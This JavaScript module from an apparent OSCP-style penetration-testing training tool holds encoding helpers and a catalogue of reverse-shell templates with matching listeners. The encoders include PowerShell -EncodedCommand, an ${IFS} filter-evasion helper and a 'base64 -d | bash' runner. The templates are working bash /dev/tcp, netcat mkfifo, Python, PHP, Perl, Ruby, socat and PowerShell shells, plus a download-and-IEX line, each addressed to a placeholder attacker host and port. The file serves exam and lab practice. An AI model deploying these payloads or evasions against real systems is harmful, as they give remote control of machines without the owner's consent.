/*!
 * obol engine, workbench.js
 * Pure, dependency-free logic for the Workbench: the "borrowed back ends" that obol runs entirely
 * client-side. No network, no execution, no state of its own. Everything here is a plain function or
 * a data table so it can be unit-tested under node and reused by the route UI.
 *
 * What lives here:
 *   - REVSHELLS: a curated reverse-shell catalogue (the common OSCP set), each a {{lhost}}/{{lport}}
 *     template with a plain-language note and a matching listener.
 *   - Encoders: UTF-8 base64, URL, hex, ROT13, and the OSCP favourite PowerShell -EncodedCommand
 *     (UTF-16LE then base64), plus a Linux "pipe to base64 -d" runner wrapper.
 * These ENRICH presentation only. They never touch the pack commands, the fact ledger, or the coach.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};
  var W = {};

  // ── byte / base64 primitives (work identically in the browser and in node) ──────────────────
  var B64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

  function bytesToB64(bytes) {
    var out = '', i;
    for (i = 0; i + 2 < bytes.length; i += 3) {
      var n = (bytes[i] << 16) | (bytes[i + 1] << 8) | bytes[i + 2];
      out += B64[(n >> 18) & 63] + B64[(n >> 12) & 63] + B64[(n >> 6) & 63] + B64[n & 63];
    }
    var rem = bytes.length - i;
    if (rem === 1) { var a = bytes[i] << 16; out += B64[(a >> 18) & 63] + B64[(a >> 12) & 63] + '=='; }
    else if (rem === 2) { var b = (bytes[i] << 16) | (bytes[i + 1] << 8); out += B64[(b >> 18) & 63] + B64[(b >> 12) & 63] + B64[(b >> 6) & 63] + '='; }
    return out;
  }

  // String → UTF-8 byte array (handles surrogate pairs).
  function utf8Bytes(str) {
    str = String(str == null ? '' : str);
    var out = [];
    for (var i = 0; i < str.length; i++) {
      var c = str.charCodeAt(i);
      if (c < 0x80) { out.push(c); }
      else if (c < 0x800) { out.push(0xc0 | (c >> 6), 0x80 | (c & 0x3f)); }
      else if (c >= 0xd800 && c < 0xdc00 && i + 1 < str.length) {
        var c2 = str.charCodeAt(++i);
        var u = 0x10000 + ((c - 0xd800) << 10) + (c2 - 0xdc00);
        out.push(0xf0 | (u >> 18), 0x80 | ((u >> 12) & 0x3f), 0x80 | ((u >> 6) & 0x3f), 0x80 | (u & 0x3f));
      } else { out.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 0x3f), 0x80 | (c & 0x3f)); }
    }
    return out;
  }

  // String → UTF-16LE byte array (what PowerShell -EncodedCommand expects).
  function utf16leBytes(str) {
    str = String(str == null ? '' : str);
    var out = [];
    for (var i = 0; i < str.length; i++) { var c = str.charCodeAt(i); out.push(c & 0xff, (c >> 8) & 0xff); }
    return out;
  }

  // ── encoders ────────────────────────────────────────────────────────────────────────────────
  W.b64 = function (str) { return bytesToB64(utf8Bytes(str)); };

  W.b64decode = function (b64) {
    b64 = String(b64 == null ? '' : b64).replace(/\s+/g, '');
    var bytes = [], buf = 0, bits = 0;
    for (var i = 0; i < b64.length; i++) {
      var ch = b64[i]; if (ch === '=') break;
      var v = B64.indexOf(ch); if (v < 0) continue;
      buf = (buf << 6) | v; bits += 6;
      if (bits >= 8) { bits -= 8; bytes.push((buf >> bits) & 0xff); }
    }
    // decode UTF-8 bytes back to a string
    var out = '', j = 0;
    while (j < bytes.length) {
      var b = bytes[j++];
      if (b < 0x80) { out += String.fromCharCode(b); }
      else if (b >= 0xc0 && b < 0xe0) { out += String.fromCharCode(((b & 0x1f) << 6) | (bytes[j++] & 0x3f)); }
      else if (b >= 0xe0 && b < 0xf0) { out += String.fromCharCode(((b & 0x0f) << 12) | ((bytes[j++] & 0x3f) << 6) | (bytes[j++] & 0x3f)); }
      else { var u = ((b & 0x07) << 18) | ((bytes[j++] & 0x3f) << 12) | ((bytes[j++] & 0x3f) << 6) | (bytes[j++] & 0x3f); u -= 0x10000; out += String.fromCharCode(0xd800 + (u >> 10), 0xdc00 + (u & 0x3ff)); }
    }
    return out;
  };

  // PowerShell -EncodedCommand payload: base64 of the UTF-16LE script bytes. OffSec teaches this to
  // sidestep quoting and bad characters on the command line.
  W.psEnc = function (script) { return bytesToB64(utf16leBytes(script)); };

  W.urlEnc = function (str) { return encodeURIComponent(String(str == null ? '' : str)); };
  W.urlEncAll = function (str) {
    // Encode EVERY byte (%NN), the aggressive form useful when a filter blocks specific characters.
    return utf8Bytes(str).map(function (b) { return '%' + ('0' + b.toString(16)).slice(-2).toUpperCase(); }).join('');
  };
  W.hexEnc = function (str) { return utf8Bytes(str).map(function (b) { return ('0' + b.toString(16)).slice(-2); }).join(''); };
  W.rot13 = function (str) {
    return String(str == null ? '' : str).replace(/[a-zA-Z]/g, function (c) {
      var base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode((c.charCodeAt(0) - base + 13) % 26 + base);
    });
  };
  // ${IFS} whitespace evasion: replace spaces with ${IFS} so a space-filtering filter still runs the
  // command. A teaching aid, shown beside a plain-language note about when it helps.
  W.ifsEvade = function (str) { return String(str == null ? '' : str).replace(/ /g, '${IFS}'); };

  // A Linux one-liner that decodes and runs a base64 payload. OffSec teaches base64-wrapping a reverse
  // shell so a tricky character set (quotes, &, redirects) survives being pasted into a target field.
  W.linuxB64Runner = function (cmd, shellBin) {
    shellBin = shellBin || 'bash';
    return 'echo ' + W.b64(cmd) + ' | base64 -d | ' + shellBin;
  };

  // ── reverse-shell catalogue ─────────────────────────────────────────────────────────────────
  // Templates use {{lhost}} and {{lport}}. `os` groups them for the UI. `enc` flags which encodings
  // make sense to offer for that payload (b64 for Linux shells, psenc for PowerShell). The note is for
  // a learner: when this one works and what to watch for.
  W.REVSHELLS = [
    {
      id: 'bash-i', name: 'Bash -i', os: 'linux', enc: ['b64'],
      tpl: 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1',
      note: 'The classic. Needs a real bash (not dash). If it hangs with no connection, the box may not have /dev/tcp, so try the mkfifo or Python form.',
    },
    {
      id: 'bash-196', name: 'Bash 196 (read line)', os: 'linux', enc: ['b64'],
      tpl: '0<&196;exec 196<>/dev/tcp/{{lhost}}/{{lport}}; sh <&196 >&196 2>&196',
      note: 'An alternate /dev/tcp form that sometimes works when "bash -i" does not.',
    },
    {
      id: 'sh-tcp', name: 'sh (/dev/tcp)', os: 'linux', enc: ['b64'],
      tpl: 'sh -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1',
      note: 'For boxes whose default shell is dash/sh. Same idea as bash -i.',
    },
    {
      id: 'nc-mkfifo', name: 'nc (mkfifo)', os: 'linux', enc: ['b64'],
      tpl: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{lhost}} {{lport}} >/tmp/f',
      note: 'Portable: works with the stripped nc that has no -e. The go-to when the box has netcat but /dev/tcp is missing.',
    },
    {
      id: 'nc-e', name: 'nc -e', os: 'linux', enc: ['b64'],
      tpl: 'nc {{lhost}} {{lport}} -e /bin/sh',
      note: 'Only works if netcat was built with -e (the "traditional" nc). Many modern boxes strip it, so keep mkfifo ready.',
    },
    {
      id: 'ncat-ssl', name: 'ncat (TLS)', os: 'linux', enc: ['b64'],
      tpl: 'ncat --ssl {{lhost}} {{lport}} -e /bin/bash',
      note: 'Encrypted shell with ncat on both ends. Start the listener with: ncat --ssl -lvnp {{lport}}.',
    },
    {
      id: 'python3', name: 'Python 3', os: 'linux', enc: ['b64'],
      tpl: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{lhost}}",{{lport}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")\'',
      note: 'Very reliable on Linux and gives you a PTY straight away (less need for the manual upgrade). Try python2/python if python3 is absent.',
    },
    {
      id: 'php', name: 'PHP', os: 'linux', enc: ['b64'],
      tpl: 'php -r \'$sock=fsockopen("{{lhost}}",{{lport}});exec("/bin/sh -i <&3 >&3 2>&3");\'',
      note: 'For a box with PHP on the path (web servers). If exec is disabled, try the system/passthru variants.',
    },
    {
      id: 'perl', name: 'Perl', os: 'linux', enc: ['b64'],
      tpl: 'perl -e \'use Socket;$i="{{lhost}}";$p={{lport}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
      note: 'Perl is on almost every Linux box. A dependable fallback when bash and python are awkward.',
    },
    {
      id: 'ruby', name: 'Ruby', os: 'linux', enc: ['b64'],
      tpl: 'ruby -rsocket -e\'f=TCPSocket.open("{{lhost}}",{{lport}}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
      note: 'For boxes with Ruby (rails apps, some appliances).',
    },
    {
      id: 'socat', name: 'socat (PTY)', os: 'linux', enc: ['b64'],
      tpl: 'socat TCP:{{lhost}}:{{lport}} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane',
      note: 'The nicest Linux shell if socat is present on BOTH ends. Listener: socat file:`tty`,raw,echo=0 TCP-LISTEN:{{lport}}.',
    },
    {
      id: 'awk', name: 'awk', os: 'linux', enc: ['b64'],
      tpl: 'awk \'BEGIN {s = "/inet/tcp/0/{{lhost}}/{{lport}}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null',
      note: 'A last-resort shell on a minimal box that still has awk. Simple line-based, no job control.',
    },
    {
      id: 'ps-tcp', name: 'PowerShell (TCP)', os: 'windows', enc: ['psenc'],
      tpl: '$client = New-Object System.Net.Sockets.TCPClient("{{lhost}}",{{lport}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
      note: 'The standard Windows one-liner. Use the Base64 (-EncodedCommand) toggle so quoting and bad characters cannot break it, which is exactly how OffSec teaches it for the OSCP.',
    },
    {
      id: 'ps-iex-download', name: 'PowerShell (download + IEX)', os: 'windows', enc: ['psenc'],
      tpl: 'IEX(New-Object Net.WebClient).DownloadString("http://{{lhost}}:{{lport}}/shell.ps1")',
      note: 'Fetches and runs a script you serve from Kali. Pair with a web server (python3 -m http.server {{lport}}) and your own shell.ps1, not a reverse-shell listener.',
    },
    {
      id: 'cmd-nc', name: 'Windows nc.exe', os: 'windows', enc: [],
      tpl: 'nc.exe {{lhost}} {{lport}} -e cmd.exe',
      note: 'Needs nc.exe staged on the target first (serve it from Kali, download it, then run). A plain cmd shell, no PowerShell.',
    },
  ];

  W.revShell = function (id) {
    for (var i = 0; i < W.REVSHELLS.length; i++) if (W.REVSHELLS[i].id === id) return W.REVSHELLS[i];
    return null;
  };

  // Substitute {{lhost}}/{{lport}} in a template. Missing values stay visible as the token so the gap
  // is obvious rather than silently producing a broken command.
  W.fill = function (tpl, vals) {
    vals = vals || {};
    var lhost = (vals.lhost != null && vals.lhost !== '') ? vals.lhost : '{{lhost}}';
    var lport = (vals.lport != null && vals.lport !== '') ? vals.lport : '{{lport}}';
    return String(tpl == null ? '' : tpl).split('{{lhost}}').join(lhost).split('{{lport}}').join(lport);
  };

  // The listener that catches a given reverse shell. ncat/socat carry their own above; everything else
  // is a plain netcat listener on the chosen port.
  W.listenerFor = function (entry, vals) {
    var lport = (vals && vals.lport != null && vals.lport !== '') ? vals.lport : '{{lport}}';
    if (!entry) return 'nc -lvnp ' + lport;
    if (entry.id === 'ncat-ssl') return 'ncat --ssl -lvnp ' + lport;
    if (entry.id === 'socat') return 'socat file:`tty`,raw,echo=0 TCP-LISTEN:' + lport;
    if (entry.id === 'ps-iex-download') return 'python3 -m http.server ' + lport + '    # serve shell.ps1 from here';
    return 'nc -lvnp ' + lport;
  };

  OBOL.workbench = W;
})(typeof globalThis !== 'undefined' ? globalThis : this);
